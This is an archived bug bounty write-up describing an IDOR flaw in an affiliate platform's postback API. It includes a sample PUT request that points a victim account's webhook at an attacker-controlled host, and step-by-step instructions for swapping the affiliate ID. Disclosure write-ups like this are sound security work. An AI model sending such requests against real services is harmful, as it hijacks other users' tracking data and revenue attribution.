# how a single JSON parameter allowed unauthorized manipulation(IDOR)

- **Source URL:** https://medium.com/@georgezakary60/how-a-single-json-parameter-allowed-unauthorized-manipulation-idor-842c5ef30110?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20260403004141/https://medium.com/@georgezakary60/how-a-single-json-parameter-allowed-unauthorized-manipulation-idor-842c5ef30110
- **Fetched:** 2026-11-19
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/13141 (id 13141)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# how a single JSON parameter allowed unauthorized manipulation(IDOR)

It started with a single parameter I wasn’t supposed to control…


In bug bounty hunting, it’s tempting to chase complex vulnerabilities — race conditions, chained exploits, or crypto flaws.

But some of the most impactful findings come from something much simpler:**A system trusting user input just a little too much.**

This is the story of how a single JSON parameter exposed a critical access control flaw in an affiliate platform.

## Understanding the Target

Whenever I approach a new program, I don’t start with payloads — I start with **business logic**.

This target was an affiliate platform. One component immediately stood out:

**Server-to-Server (S2S) Postbacks**

These are essentially webhooks used to track conversions — registrations, purchases, or other valuable actions.

They directly influence **revenue attribution**.

*If an attacker can control postbacks, they can manipulate tracking — and potentially money.*


## 🔍 Intercepting the Request

Using Burp Suite, I modified a postback URL in my account (Account A) and intercepted the request:

```
PUT /api/affiliate/postback/13306 HTTP/2
Host: target.com
Content-Type: application/json
```
```
{
  "affiliateId": 1397498,
  "url": "https://attacker.oastify.com",
  "name": "Test Postback"
}
```
One field immediately caught my attention:

`"affiliateId": 1397498`
This raised a critical question:

*Why is the server accepting an affiliate ID from the client?*


In a properly secured system, the backend should derive the user’s identity from the session — not from user-controlled input.

## 🧪 The Test: Breaking Assumptions

To validate this, I performed a simple A/B test.

- **Account A** → my attacker account
- **Account B** → a separate test account (victim)

## Steps:

1. Logged in as Account A
2. Intercepted the postback update request
3. Replaced:

- “affiliateId”: 1397498 with Account B’s ID

4\. Forwarded the request

The server responded:

`HTTP/2 200 Ok`
At this point, the response alone wasn’t enough.

So I switched to Account B and refreshed the page.

## 💥 The Result

The postback URL for Account B had been successfully modified.

No authorization check.

No validation.

No restriction.

Just blind trust in user input.

Ultimately, the Bugcrowd triage team validated the exploit, accepting it as a P3 vulnerability. While it was flagged as a duplicate this time around, having the finding confirmed is a testament to the importance of always checking those hidden JSON parameters.

Happy hunting!
